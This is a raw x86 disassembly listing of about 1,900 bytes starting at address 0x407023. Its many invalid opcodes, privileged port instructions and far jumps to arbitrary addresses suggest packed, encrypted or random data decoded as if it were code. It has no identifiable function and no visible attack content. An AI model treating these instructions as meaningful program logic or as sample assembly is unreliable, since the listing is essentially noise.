  407023:	xchg   BYTE PTR [ebx+0x6c],bl
  407026:	dec    ebx
  407027:	dec    edx
  407028:	adc    eax,0xbd4d40f2
  40702d:	stos   DWORD PTR es:[edi],eax
  40702e:	(bad)  
  40702f:	es out 0x65,al
  407032:	and    eax,0x864f2bfe
  407037:	out    dx,eax
  407038:	cmp    ecx,edx
  40703a:	xor    ch,bh
  40703c:	imul   ebx,DWORD PTR [edi-0x5053a01],0xffffffe3
  407043:	data16 adc ah,BYTE PTR [ecx]
  407046:	fcmovne st,st(4)
  407048:	repnz sar BYTE PTR ss:[eax-0x6dbb650c],0xee
  407051:	aas    
  407052:	ds into 
  407054:	xchg   ebx,eax
  407055:	test   eax,0x8187a447
  40705a:	bound  eax,QWORD PTR [ecx-0x36]
  40705d:	jne    0x407004
  40705f:	std    
  407060:	pop    ecx
  407061:	pop    ecx
  407062:	mov    eax,ds:0x6e963ce
  407067:	push   ds
  407068:	or     ah,0xac
  40706b:	mov    ds:0x9624bf99,eax
  407070:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407072:	test   al,0x7e
  407074:	xchg   edi,eax
  407075:	push   edi
  407076:	or     DWORD PTR [eax],ebx
  407078:	sub    ah,BYTE PTR [ecx-0x430a857d]
  40707e:	mov    al,cl
  407080:	aas    
  407081:	sub    bh,ah
  407083:	and    eax,0xa7c6198d
  407088:	sub    eax,0x2b1a4983
  40708d:	in     al,0xc4
  40708f:	in     eax,dx
  407090:	fs and cl,bh
  407093:	and    BYTE PTR [edx+0x55dab65e],al
  407099:	stos   DWORD PTR es:[edi],eax
  40709a:	std    
  40709b:	mov    cl,0x32
  40709d:	cmp    eax,0xf5fc89d4
  4070a2:	ds pop edx
  4070a4:	fcmovnu st,st(5)
  4070a6:	dec    ebp
  4070a7:	ja     0x40707d
  4070a9:	mov    esp,0xe4fa36e0
  4070af:	dec    esp
  4070b0:	inc    ebx
  4070b1:	add    eax,0xe78025b0
  4070b6:	or     eax,DWORD PTR [eax]
  4070b8:	inc    eax
  4070b9:	mov    dh,0x14
  4070bb:	adc    BYTE PTR [ecx+ecx*1-0x70f090f0],cl
  4070c2:	sti    
  4070c3:	xchg   ecx,eax
  4070c4:	js     0x407052
  4070c6:	sahf   
  4070c7:	loopne 0x40711e
  4070c9:	hlt    
  4070ca:	js     0x407127
  4070cc:	xchg   esp,eax
  4070cd:	push   ds
  4070ce:	fwait
  4070cf:	push   eax
  4070d0:	sub    ebx,DWORD PTR [esi-0x7ffcef74]
  4070d6:	sub    ebp,ebx
  4070d8:	xchg   ebp,eax
  4070d9:	data16 std 
  4070db:	sbb    eax,DWORD PTR [esi+0x55]
  4070de:	dec    eax
  4070df:	add    al,0x18
  4070e1:	retf   
  4070e2:	and    al,0x4f
  4070e4:	repz retf 
  4070e6:	dec    ecx
  4070e7:	in     eax,0x86
  4070e9:	mov    al,ds:0xc4563a24
  4070ee:	add    ebx,edx
  4070f0:	inc    ebx
  4070f1:	mov    al,0x9b
  4070f3:	fild   QWORD PTR [edi+0x7bd906d6]
  4070f9:	jne    0x407153
  4070fb:	xor    DWORD PTR [eax],ebx
  4070fd:	ins    DWORD PTR es:[edi],dx
  4070fe:	xchg   ebx,eax
  4070ff:	add    ebx,DWORD PTR [ebx]
  407101:	mov    ?,esi
  407103:	fst    st(3)
  407105:	pop    esp
  407106:	add    DWORD PTR ds:0x835919f3,edx
  40710c:	clc    
  40710d:	mov    esp,0xeb8f3f89
  407112:	jl     0x407115
  407114:	adc    al,0x8e
  407116:	shl    DWORD PTR [edx],0xf5
  407119:	jmp    0xb0e99a2b
  40711e:	test   ah,al
  407120:	and    ebp,DWORD PTR [esi+edx*8-0x312460c2]
  407127:	out    0x61,eax
  407129:	dec    esp
  40712a:	or     bl,ch
  40712c:	stos   DWORD PTR es:[edi],eax
  40712d:	sbb    dl,dh
  40712f:	jge    0x40715d
  407131:	xor    dl,BYTE PTR [eax-0x5722f000]
  407137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407138:	js     0x407151
  40713a:	int    0x7a
  40713c:	xchg   ebx,eax
  40713d:	push   edx
  40713e:	dec    BYTE PTR [ecx+eax*8]
  407141:	inc    eax
  407142:	fisttp QWORD PTR [esi+0x3ca6dd52]
  407148:	ins    DWORD PTR es:[edi],dx
  407149:	nop
  40714a:	xchg   esi,eax
  40714b:	jp     0x40715c
  40714d:	ficomp DWORD PTR [eax-0x74]
  407150:	icebp  
  407151:	loopne 0x40714e
  407153:	fisub  WORD PTR [ebp+0x3667f4e7]
  407159:	or     al,0xd0
  40715b:	mov    eax,ds:0xaed8a536
  407160:	bound  eax,QWORD PTR [eax-0x3541c207]
  407166:	push   es
  407167:	popf   
  407168:	push   ecx
  407169:	cli    
  40716a:	mov    ch,0x48
  40716c:	xchg   esp,eax
  40716d:	push   cs
  40716e:	fs retf 
  407170:	mov    eax,ds:0x21f3dcaa
  407175:	int    0x9d
  407177:	xor    eax,DWORD PTR [eax]
  407179:	xor    al,0x5b
  40717b:	std    
  40717c:	int    0x24
  40717e:	fsubr  DWORD PTR [ecx+0x235bff57]
  407184:	std    
  407185:	xor    BYTE PTR [esi+0x8],0x9b
  407189:	dec    esp
  40718a:	addr16 repnz mov ah,0xc9
  40718e:	lods   eax,DWORD PTR ds:[esi]
  40718f:	sar    DWORD PTR [esi],1
  407191:	outs   dx,DWORD PTR ds:[esi]
  407192:	mov    al,BYTE PTR [esi-0x55ac4f9f]
  407198:	mov    eax,ds:0xe228eaac
  40719d:	xor    BYTE PTR [edx],0x57
  4071a0:	test   al,0x2c
  4071a2:	and    DWORD PTR [ebx-0x69],0xffffff92
  4071a6:	stos   BYTE PTR es:[edi],al
  4071a7:	out    dx,al
  4071a8:	arpl   ax,bp
  4071aa:	push   ss
  4071ab:	ins    DWORD PTR es:[edi],dx
  4071ac:	add    BYTE PTR [ecx+0x4662fc45],0x50
  4071b3:	lods   al,BYTE PTR ds:[esi]
  4071b4:	call   0x2195:0xace38d58
  4071bb:	sti    
  4071bc:	or     al,0xee
  4071be:	inc    ebx
  4071bf:	push   esp
  4071c0:	test   DWORD PTR [ebp-0x64],esi
  4071c3:	cmp    DWORD PTR [esp+ebx*1-0x5c780fbc],esi
  4071ca:	hlt    
  4071cb:	dec    ebx
  4071cc:	and    al,0xdb
  4071ce:	pop    esp
  4071cf:	stos   BYTE PTR es:[edi],al
  4071d0:	scas   eax,DWORD PTR es:[edi]
  4071d1:	test   DWORD PTR [esi],esi
  4071d3:	out    dx,eax
  4071d4:	inc    esi
  4071d5:	ror    DWORD PTR [ecx+0x16],1
  4071d8:	int    0x25
  4071da:	out    0xc0,al
  4071dc:	sub    edx,ecx
  4071de:	and    al,0x69
  4071e0:	les    eax,FWORD PTR [edi]
  4071e2:	call   0x8b08d6fc
  4071e7:	dec    esp
  4071e8:	adc    DWORD PTR [edx+eax*1+0x6f],0x2
  4071ed:	xor    al,cl
  4071ef:	inc    eax
  4071f0:	or     cl,bh
  4071f2:	add    al,0xfd
  4071f4:	mov    al,ds:0x70abceda
  4071f9:	inc    esi
  4071fa:	fcmovbe st,st(0)
  4071fc:	scas   eax,DWORD PTR es:[edi]
  4071fd:	jge    0x4071c3
  4071ff:	cwde   
  407200:	and    al,0x15
  407202:	data16 cli 
  407204:	test   al,0xf
  407206:	xlat   BYTE PTR ds:[ebx]
  407207:	bts    DWORD PTR [eax],ecx
  40720a:	push   esp
  40720b:	ins    BYTE PTR es:[edi],dx
  40720c:	clc    
  40720d:	xchg   ebp,eax
  40720e:	inc    edi
  40720f:	js     0x407203
  407211:	out    dx,eax
  407212:	mov    BYTE PTR [esi-0x20702775],cl
  407218:	push   esp
  407219:	jne    0x4071a5
  40721b:	das    
  40721c:	(bad)  
  40721d:	int    0x21
  40721f:	fiadd  DWORD PTR [ebx+0xa]
  407222:	xor    BYTE PTR ds:0x494f0159,0x26
  407229:	xor    dh,BYTE PTR [edi+edx*8+0x3b]
  40722d:	mov    ds:0xfb1e5233,al
  407232:	(bad)  
  407233:	mov    ah,0x85
  407235:	sbb    esi,DWORD PTR [edx-0x3f]
  407238:	aas    
  407239:	mov    edx,0xa2ca3a39
  40723e:	jecxz  0x40722e
  407240:	in     al,dx
  407241:	pop    esp
  407242:	mov    ah,0x9d
  407244:	cdq    
  407245:	cmp    bh,cl
  407247:	xchg   ebp,eax
  407248:	or     esi,DWORD PTR [eax+0x29]
  40724b:	jecxz  0x4072bc
  40724d:	stos   DWORD PTR es:[edi],eax
  40724e:	jge    0x407273
  407250:	data16 cld 
  407252:	jns    0x407269
  407254:	fistp  QWORD PTR [ebx+0x6bf687aa]
  40725a:	lahf   
  40725b:	jle    0x407217
  40725d:	sbb    BYTE PTR [ebp-0x5c],ch
  407260:	repz (bad) 
  407262:	lds    ecx,FWORD PTR [esi+0x718a5ce9]
  407268:	or     edi,eax
  40726a:	gs xor eax,ebx
  40726d:	push   ebx
  40726e:	sub    ah,BYTE PTR [ecx]
  407270:	xchg   BYTE PTR [ebx+edi*4-0xa],bh
  407274:	adc    bh,ah
  407276:	mov    dh,0xa5
  407278:	pop    ds
  407279:	ret    
  40727a:	jp     0x40720a
  40727c:	push   ebp
  40727d:	adc    DWORD PTR [eax-0x10],eax
  407280:	adc    DWORD PTR [ebp-0x7e15bde6],ebp
  407286:	sbb    edx,DWORD PTR [edi]
  407288:	stos   BYTE PTR es:[edi],al
  407289:	add    BYTE PTR [eax],bl
  40728b:	nop
  40728c:	cld    
  40728d:	mov    dl,0x64
  40728f:	popa   
  407290:	fisub  DWORD PTR [ecx+0x51dfa642]
  407296:	xchg   ebp,eax
  407297:	cmp    BYTE PTR [edi-0x7150d65d],ch
  40729d:	xlat   BYTE PTR ds:[ebx]
  40729e:	and    al,0x50
  4072a0:	jmp    0x1d61c3eb
  4072a5:	fcmove st,st(7)
  4072a7:	stos   DWORD PTR es:[edi],eax
  4072a8:	js     0x40722e
  4072aa:	add    DWORD PTR [eax],ecx
  4072ac:	outs   dx,BYTE PTR ds:[esi]
  4072ad:	(bad)  
  4072af:	mov    dh,0x2a
  4072b1:	xchg   ebp,eax
  4072b2:	ror    eax,0x3c
  4072b5:	das    
  4072b6:	dec    esp
  4072b7:	xor    dl,BYTE PTR [esi]
  4072b9:	inc    edx
  4072ba:	jg     0x40728b
  4072bc:	fs mov ?,edx
  4072bf:	add    al,BYTE PTR [eax]
  4072c1:	sub    edx,DWORD PTR [edx+0x44]
  4072c4:	in     al,dx
  4072c5:	add    BYTE PTR [eax],ah
  4072c7:	dec    eax
  4072c8:	add    al,BYTE PTR [eax]
  4072ca:	xchg   BYTE PTR [esi+0x67],cl
  4072cd:	scas   al,BYTE PTR es:[edi]
  4072ce:	push   ss
  4072cf:	add    DWORD PTR [edx-0x18011ce8],ebp
  4072d5:	xor    DWORD PTR [eax-0x635368b4],esi
  4072db:	xchg   esp,eax
  4072dc:	push   edx
  4072dd:	mov    DWORD PTR [esi],ebx
  4072df:	loopne 0x4072b6
  4072e1:	(bad)  
  4072e2:	outs   dx,DWORD PTR ds:[esi]
  4072e3:	pop    es
  4072e4:	push   es
  4072e5:	call   0x317f4475
  4072ea:	test   BYTE PTR [edi-0x17],dh
  4072ed:	and    eax,0x8a755b69
  4072f2:	outs   dx,BYTE PTR ds:[esi]
  4072f3:	push   ds
  4072f4:	push   edi
  4072f5:	mov    esi,0xad6b3ba3
  4072fa:	or     eax,0xedcf4481
  4072ff:	ss out 0x67,eax
  407302:	or     eax,0x5fb74100
  407307:	jo     0x4072fe
  407309:	mov    DWORD PTR [eax+eax*2],0x62aba919
  407310:	adc    ecx,edx
  407312:	outs   dx,DWORD PTR ds:[esi]
  407313:	outs   dx,DWORD PTR ds:[esi]
  407314:	loop   0x4072eb
  407316:	pop    ds
  407317:	xchg   ecx,eax
  407318:	jge    0x407381
  40731a:	sbb    ch,BYTE PTR [esi]
  40731c:	sub    al,0xf8
  40731e:	mov    bh,0x3d
  407320:	in     eax,dx
  407321:	outs   dx,DWORD PTR ds:[esi]
  407322:	push   edi
  407323:	mov    edx,0x7e2e90fa
  407328:	or     DWORD PTR [edx+0x74],eax
  40732b:	pop    ebp
  40732c:	(bad)  
  40732d:	stos   DWORD PTR es:[edi],eax
  40732e:	or     esp,DWORD PTR [ebx]
  407330:	setns  BYTE PTR [edx]
  407333:	adc    ebx,edx
  407335:	mov    al,0xb7
  407337:	inc    ebp
  407338:	fild   QWORD PTR [edi+0x53]
  40733b:	outs   dx,DWORD PTR ds:[esi]
  40733c:	mov    WORD PTR [esi-0x6097e8b4],cs
  407342:	ss aam 0xe1
  407345:	xchg   edi,eax
  407346:	call   0x5bbc5b89
  40734b:	sbb    BYTE PTR [eax],ch
  40734d:	rol    dh,cl
  40734f:	push   edx
  407350:	jmp    0x4072fc
  407352:	push   cs
  407353:	xchg   esi,eax
  407354:	jmp    0xcfd1:0x94dddabd
  40735b:	icebp  
  40735c:	jns    0x40737b
  40735e:	dec    esp
  40735f:	push   esp
  407360:	rol    BYTE PTR [esi+0x37],1
  407363:	inc    edi
  407364:	(bad)  
  407365:	xlat   BYTE PTR ds:[ebx]
  407366:	(bad)
  40736a:	dec    esp
  40736b:	mov    bh,0x4a
  40736d:	(bad)  
  40736f:	adc    DWORD PTR ds:0xf0924095,ebp
  407375:	ficomp DWORD PTR [ecx+ebp*4]
  407378:	cmp    bl,BYTE PTR [ebx+0x1a]
  40737b:	iret   
  40737c:	dec    ecx
  40737d:	add    eax,0x72dac1a
  407382:	xor    esp,DWORD PTR [edi]
  407384:	imul   ebx,DWORD PTR [eax-0x15],0x19d72099
  40738b:	xchg   esp,eax
  40738c:	sti    
  40738d:	push   edi
  40738e:	clc    
  40738f:	aaa    
  407390:	mov    ebp,0x22f3e594
  407395:	add    dh,BYTE PTR [eax]
  407397:	mov    eax,0x64f0f46
  40739c:	push   esp
  40739d:	sbb    DWORD PTR [esi],ebp
  40739f:	mov    ebx,DWORD PTR [eax]
  4073a1:	fimul  DWORD PTR [ebp-0x71]
  4073a4:	jae    0x407405
  4073a6:	and    BYTE PTR [esi+0x7d],dl
  4073a9:	in     eax,0xe0
  4073ab:	retf   0xfe46
  4073ae:	add    eax,eax
  4073b0:	mov    dl,0xcc
  4073b2:	cli    
  4073b3:	jle    0x407347
  4073b5:	and    eax,0x20ccc381
  4073ba:	jo     0x40741b
  4073bc:	mov    ebp,0xe10dc196
  4073c1:	mov    ch,0x58
  4073c3:	icebp  
  4073c4:	mov    al,ds:0x6be36ec7
  4073c9:	jle    0x40738c
  4073cb:	popf   
  4073cc:	xchg   ecx,eax
  4073cd:	xor    dl,bh
  4073cf:	xchg   DWORD PTR [ebx+0x628c2935],esi
  4073d5:	es int 0xb
  4073d8:	add    DWORD PTR [eax],eax
  4073da:	and    BYTE PTR [eax+0x353340],al
  4073e0:	push   ebp
  4073e1:	jg     0x40738a
  4073e3:	mov    eax,0xb1ae1e4f
  4073e8:	fmulp  st(5),st
  4073ea:	mov    ebp,?
  4073ec:	std    
  4073ed:	fstp   DWORD PTR [edx]
  4073ef:	in     eax,dx
  4073f0:	aas    
  4073f1:	test   eax,0x3abb7c4a
  4073f6:	es add cl,ah
  4073f9:	mov    bl,0x85
  4073fb:	push   edi
  4073fc:	push   ebp
  4073fd:	add    BYTE PTR [ecx],0x60
  407400:	out    dx,al
  407401:	inc    eax
  407402:	es daa 
  407404:	jecxz  0x4073a4
  407406:	inc    edx
  407407:	xor    dl,BYTE PTR [eax]
  407409:	lahf   
  40740a:	cmp    DWORD PTR [ecx-0xc],0x90445e2e
  407411:	addr16 aas 
  407413:	test   eax,0xbb310d37
  407418:	sbb    DWORD PTR ss:[ebx],ecx
  40741b:	cmp    ah,BYTE PTR [edi+ebx*4]
  40741e:	xbegin 0xf27716be
  407424:	(bad)  
  407425:	popa   
  407426:	inc    esp
  407427:	out    dx,al
  407428:	shl    bh,1
  40742a:	cwde   
  40742b:	call   0xc3c84080
  407430:	stc    
  407431:	cmp    al,0x6d
  407433:	lea    eax,[edi+0x25]
  407436:	xchg   edx,eax
  407437:	lock jle 0x4073f8
  40743a:	das    
  40743b:	pop    esp
  40743c:	mov    al,0x46
  40743e:	mov    edx,0xb9ed43fc
  407443:	sar    eax,0x1e
  407446:	loope  0x4074be
  407448:	call   0x42aa:0x806fd4
  40744f:	and    DWORD PTR [edx-0x50],esi
  407452:	popf   
  407453:	add    DWORD PTR [edx+0x52],esp
  407456:	mov    bl,0x60
  407458:	int    0xef
  40745a:	xchg   esi,eax
  40745b:	js     0x40745d
  40745d:	jne    0x4073ee
  40745f:	or     DWORD PTR cs:[edx+eax*2],ebp
  407463:	mov    BYTE PTR [ecx],dh
  407465:	test   al,0x2d
  407467:	jae    0x4074b3
  407469:	fnstsw WORD PTR [eax+edx*1]
  40746c:	popf   
  40746d:	cli    
  40746e:	(bad)  
  40746f:	fdivr  QWORD PTR [esi-0x78]
  407472:	sti    
  407473:	mov    eax,0x66c38d7
  407478:	mov    cl,0x44
  40747a:	mov    ds:0x71363f1f,eax
  40747f:	push   edx
  407480:	mov    cl,bl
  407482:	dec    edx
  407483:	and    al,0x65
  407485:	rcr    BYTE PTR [ebp-0x6fcdd325],0xe8
  40748c:	mov    ecx,0x6b3a1849
  407491:	add    BYTE PTR [eax+0x55],ch
  407494:	push   ebx
  407495:	fidivr WORD PTR [esi+ebp*4-0x263155b2]
  40749c:	popf   
  40749d:	out    dx,eax
  40749e:	xchg   edx,eax
  40749f:	call   0xda2ec0da
  4074a4:	or     dl,0x5
  4074a7:	iret   
  4074a8:	pop    eax
  4074a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074aa:	cwde   
  4074ab:	mov    dh,0xeb
  4074ad:	jmp    0x407513
  4074af:	js     0x407506
  4074b1:	inc    ebx
  4074b2:	popa   
  4074b3:	dec    esp
  4074b4:	xchg   esp,eax
  4074b5:	hlt    
  4074b6:	ret    0x3c20
  4074b9:	cmp    DWORD PTR [esi-0x2c],edx
  4074bc:	xor    edi,ebp
  4074be:	cs in  al,dx
  4074c0:	jp     0x4074ac
  4074c2:	jle    0x40747e
  4074c4:	add    al,0x37
  4074c6:	inc    edx
  4074c7:	ins    DWORD PTR es:[edi],dx
  4074c8:	(bad)  
  4074ca:	and    dh,ah
  4074cc:	jecxz  0x4074da
  4074ce:	add    BYTE PTR [edi],al
  4074d0:	cmc    
  4074d1:	mov    al,ds:0x210031b
  4074d6:	ins    BYTE PTR es:[edi],dx
  4074d7:	mov    esi,0x2fd2cd9e
  4074dc:	daa    
  4074dd:	xchg   ebx,eax
  4074de:	hlt    
  4074df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e0:	out    0x2b,eax
  4074e2:	pop    ds
  4074e3:	psadbw mm0,QWORD PTR ds:[edi]
  4074e7:	clc    
  4074e8:	cmp    ch,BYTE PTR [eax]
  4074ea:	leave  
  4074eb:	xchg   DWORD PTR gs:[esi+ebx*8-0x54dca569],edx
  4074f3:	stc    
  4074f4:	push   ebx
  4074f5:	push   ebx
  4074f6:	cmp    DWORD PTR [ecx+0x1e7841c],ecx
  4074fc:	sar    DWORD PTR [ecx-0x10],1
  4074ff:	(bad)  
  407500:	bound  eax,QWORD PTR [edx]
  407502:	or     eax,0x6f1a36ea
  407507:	add    DWORD PTR [edx+eiz*4],0xfffffff0
  40750b:	imul   esp,DWORD PTR [ebx+0x5f],0xffffff82
  40750f:	inc    esi
  407510:	addr16 mov ds:0xf8c2,al
  407514:	rcl    BYTE PTR [ecx],1
  407516:	xchg   ecx,eax
  407517:	arpl   WORD PTR [esi+0x3f32c588],cx
  40751d:	ret    
  40751e:	mov    BYTE PTR [ecx-0x7e7db168],0x1d
  407525:	mov    ebx,0xec12ab28
  40752a:	add    dl,BYTE PTR [edx]
  40752c:	popf   
  40752d:	(bad)  
  40752e:	in     eax,dx
  40752f:	mov    ecx,0x21d2a578
  407534:	(bad)  [edi+ecx*2-0x2d9d18ed]
  40753b:	lahf   
  40753c:	mov    edi,0xfa97ce9
  407541:	mov    BYTE PTR [eax-0x7f],bl
  407544:	aaa    
  407545:	push   esi
  407546:	addr16 call 0xfd5f2033
  40754c:	push   ecx
  40754d:	lods   eax,DWORD PTR ds:[esi]
  40754e:	push   edi
  40754f:	fidiv  DWORD PTR [ebx]
  407551:	stos   BYTE PTR es:[edi],al
  407552:	cmc    
  407553:	aad    0xeb
  407555:	mov    ah,0xc1
  407557:	shl    DWORD PTR [esp+edx*8+0x6d],cl
  40755b:	jbe    0x407598
  40755d:	jmp    0xd59ec36d
  407562:	dec    ebx
  407563:	pusha  
  407564:	pop    ebp
  407565:	stc    
  407566:	outs   dx,BYTE PTR ds:[esi]
  407567:	call   0x176:0xb9ee9f5f
  40756e:	ss fwait
  407570:	or     esp,DWORD PTR [ecx-0x22]
  407573:	add    BYTE PTR [esi+ebp*1-0x2755d01b],bh
  40757a:	mov    ah,0xa3
  40757c:	push   ebx
  40757d:	int    0x5
  40757f:	or     edi,DWORD PTR fs:[esi-0x7b]
  407583:	lahf   
  407584:	cmc    
  407585:	out    0x56,eax
  407587:	lods   eax,DWORD PTR ds:[esi]
  407588:	adc    esi,DWORD PTR [ecx+0x1b]
  40758b:	sub    edi,DWORD PTR [edi]
  40758d:	cmp    DWORD PTR [ecx],edx
  40758f:	dec    ecx
  407590:	jae    0x407518
  407592:	ds cmp eax,0x9ccf52cd
  407598:	jmp    0x4075e8
  40759a:	(bad)  [edx]
  40759c:	mul    BYTE PTR [ecx]
  40759e:	jg     0x407523
  4075a0:	(bad)  
  4075a2:	push   esp
  4075a3:	xchg   edi,eax
  4075a4:	pop    esp
  4075a5:	jnp    0x4075f3
  4075a7:	pop    ebx
  4075a8:	retf   0x4a25
  4075ab:	xchg   edx,eax
  4075ac:	(bad)  
  4075ad:	fld    TBYTE PTR [edx-0x65cff7a3]
  4075b3:	cmp    eax,0x9f2da3ac
  4075b8:	aam    0x79
  4075ba:	add    ah,BYTE PTR [esi]
  4075bc:	mov    dl,BYTE PTR [eax-0x2e]
  4075bf:	xchg   DWORD PTR [ebx],ebx
  4075c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075c2:	les    edi,FWORD PTR [ecx+eax*1-0x80]
  4075c6:	aaa    
  4075c7:	repz xor esp,eax
  4075ca:	xchg   ebx,eax
  4075cb:	add    BYTE PTR [eax+eiz*4],al
  4075ce:	push   0x40
  4075d0:	mov    al,BYTE PTR [eax+0x11]
  4075d3:	pop    ss
  4075d4:	mov    WORD PTR [edi-0x15b2228f],ss
  4075da:	jo     0x40763e
  4075dc:	adc    al,0x97
  4075de:	pop    ecx
  4075df:	xchg   ecx,eax
  4075e0:	fisub  DWORD PTR [eax]
  4075e2:	mov    al,ds:0x7fb6b190
  4075e7:	xor    eax,DWORD PTR [ecx-0x75eff7b8]
  4075ed:	lock ja 0x4075cd
  4075f0:	mov    edx,0x463548e5
  4075f5:	fist   DWORD PTR [ebx-0x57]
  4075f8:	add    DWORD PTR [ecx+0xe9a9967],esi
  4075fe:	aaa    
  4075ff:	repnz icebp 
  407601:	adc    DWORD PTR [esi],edi
  407603:	in     eax,0x46
  407605:	push   edi
  407606:	and    eax,0xb1a2a178
  40760b:	pop    esp
  40760c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40760d:	pop    esi
  40760e:	mov    ds:0x13fd3c0f,eax
  407613:	push   ecx
  407614:	add    DWORD PTR [esi],ebx
  407616:	stos   BYTE PTR es:[edi],al
  407617:	int    0x8f
  407619:	jecxz  0x407683
  40761b:	xchg   ebp,eax
  40761c:	pop    ds
  40761d:	pusha  
  40761e:	add    eax,ecx
  407620:	mov    bl,0x19
  407622:	jecxz  0x4075d7
  407624:	add    al,BYTE PTR [eax-0x7338d53b]
  40762a:	pop    eax
  40762b:	xchg   ebx,eax
  40762c:	shr    ah,0xe9
  40762f:	push   es
  407630:	jecxz  0x40760f
  407632:	xchg   edi,eax
  407633:	jnp    0x40763c
  407635:	imul   ebp,DWORD PTR [edi-0x17660fca],0xa0c03c2c
  40763f:	inc    esi
  407640:	pop    edx
  407641:	fdivr  DWORD PTR fs:[ebp+0xf43de25]
  407648:	inc    esp
  407649:	stos   DWORD PTR es:[edi],eax
  40764a:	fmul   st(1),st
  40764c:	xor    ebp,DWORD PTR [edx]
  40764e:	add    cl,BYTE PTR [edi-0x39]
  407651:	loopne 0x40764e
  407653:	sub    cl,ah
  407655:	mov    eax,ebp
  407657:	xor    eax,0x655c8f16
  40765c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765d:	(bad)  
  40765f:	in     al,dx
  407660:	daa    
  407661:	xchg   ecx,eax
  407662:	bound  ecx,QWORD PTR [ebp+0x26125e60]
  407668:	xchg   BYTE PTR [ecx+eax*1+0x0],al
  40766c:	mov    eax,0xabf4a932
  407671:	(bad)  
  407673:	jns    0x4076a0
  407675:	mov    bh,0xf9
  407677:	and    edi,DWORD PTR [edx+0x2]
  40767a:	cwde   
  40767b:	add    BYTE PTR [eax],ah
  40767d:	inc    eax
  40767e:	sar    BYTE PTR ds:0xc61f62c,1
  407684:	dec    ebp
  407685:	dec    eax
  407686:	lods   eax,DWORD PTR ds:[esi]
  407687:	pop    ecx
  407688:	icebp  
  407689:	xor    DWORD PTR [ecx],ecx
  40768b:	mov    WORD PTR [eax-0x42],gs
  40768e:	dec    ecx
  40768f:	scas   eax,DWORD PTR es:[edi]
  407690:	or     BYTE PTR [eax],cl
  407692:	mov    edx,0xb793cc39
  407697:	popf   
  407698:	daa    
  407699:	iret   
  40769a:	mov    BYTE PTR [ebx-0x7dacf95c],ch
  4076a0:	jmp    0xcc52:0xfa49dec7
  4076a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076a8:	(bad)  
  4076a9:	ja     0x4076cb
  4076ab:	jle    0x4076ae
  4076ad:	and    BYTE PTR [esp+esi*4+0x66],al
  4076b1:	rcl    BYTE PTR [edi],0xe6
  4076b4:	test   BYTE PTR ss:[edx+0x19],al
  4076b8:	scas   eax,DWORD PTR es:[edi]
  4076b9:	iret   
  4076ba:	dec    ebp
  4076bb:	ror    DWORD PTR [edi],cl
  4076bd:	jp     0x40773a
  4076bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c0:	jo     0x407648
  4076c2:	mov    eax,ds:0xa28e5ec3
  4076c7:	fmul   QWORD PTR [eax]
  4076c9:	mov    BYTE PTR [edx-0x537d4339],bl
  4076cf:	es out 0x33,eax
  4076d2:	push   eax
  4076d3:	mov    ebp,0x5f4dda3e
  4076d8:	loope  0x407698
  4076da:	cmp    BYTE PTR [esi],0x2a
  4076dd:	popa   
  4076de:	ret    
  4076df:	cmp    al,0x89
  4076e1:	ds retf 0xf19f
  4076e5:	push   esp
  4076e6:	mov    ebx,0xa41c9474
  4076eb:	lea    edi,[edi+0x72]
  4076ee:	xchg   ebp,eax
  4076ef:	add    DWORD PTR [eax],edx
  4076f1:	adc    edi,ecx
  4076f3:	outs   dx,BYTE PTR ds:[esi]
  4076f4:	jp     0x4076f4
  4076f6:	pop    ebp
  4076f7:	and    BYTE PTR [ecx-0xd],0x21
  4076fb:	int3   
  4076fc:	sbb    eax,DWORD PTR [eax+0x32fafa17]
  407702:	pop    ebp
  407703:	inc    esp
  407704:	hlt    
  407705:	sti    
  407706:	or     DWORD PTR ds:0x8a537ddd,esp
  40770c:	mov    ch,0xc4
  40770e:	add    al,0x38
  407710:	dec    ebp
  407711:	jp     0x4076c2
  407713:	dec    ecx
  407714:	rcr    cl,cl
  407716:	ret    0x4afd
  407719:	adc    bl,dl
  40771b:	lods   eax,DWORD PTR ds:[esi]
  40771c:	mov    ch,BYTE PTR [edi-0x70]
  40771f:	mov    dh,0xc1
  407721:	pusha  
  407722:	fcom   QWORD PTR [eax]
  407724:	and    eax,0x3d1d26f9
  407729:	div    DWORD PTR [eax+0x6d]
  40772c:	into   
  40772d:	in     eax,0x8b
  40772f:	out    0xbd,eax
  407731:	xchg   edx,eax
  407732:	xchg   esp,eax
  407733:	push   esp
  407734:	add    bh,dh
  407736:	fnstcw WORD PTR ds:0x37ecab8e
  40773c:	fs xchg ebp,eax
  40773e:	fdiv   QWORD PTR [edx]
  407740:	sbb    DWORD PTR [ebp+0x2a79d6a2],ebx
  407746:	xchg   edi,eax
  407747:	or     BYTE PTR [edi-0x3f56f023],0x3a
  40774e:	das    
  40774f:	mov    ds:0xcd0b1a19,eax
  407754:	lods   eax,DWORD PTR ds:[esi]
  407755:	es test al,0x88
  407758:	xchg   esp,eax
  407759:	pop    ss
  40775a:	or     dh,al
  40775c:	ret    
  40775d:	push   cs
  40775e:	push   esi
  40775f:	fst    QWORD PTR [eax]
  407761:	xor    eax,0xa5d91258
  407766:	inc    edi
  407767:	out    0x9,al
  407769:	dec    edx
  40776a:	(bad)  
  40776b:	aad    0x74
  40776d:	(bad)  
  40776e:	enter  0x9e88,0xcb
  407772:	xor    ebx,DWORD PTR [esi-0x2f27b636]
  407778:	scas   eax,DWORD PTR es:[edi]
  407779:	add    BYTE PTR [ecx],cl
  40777b:	mov    al,ds:0xd3e6a9be
  407780:	sti    
  407781:	(bad)  
  407782:	es (bad) 
  407784:	sar    ch,1
  407786:	dec    ebp
  407787:	out    0x3,al
  407789:	cmp    al,0x3f
  40778b:	dec    eax
  40778c:	mov    dl,BYTE PTR [edx+edi*2-0x24b44b6d]
  407793:	add    BYTE PTR [esi],bl
  407795:	stos   BYTE PTR es:[edi],al
  407796:	sub    eax,0xa3b6e74c
  40779b:	add    DWORD PTR [ebp-0x1a],ebp
  40779e:	lar    eax,cx
  4077a1:	mov    ecx,0x192f38e
  4077a6:	pusha  
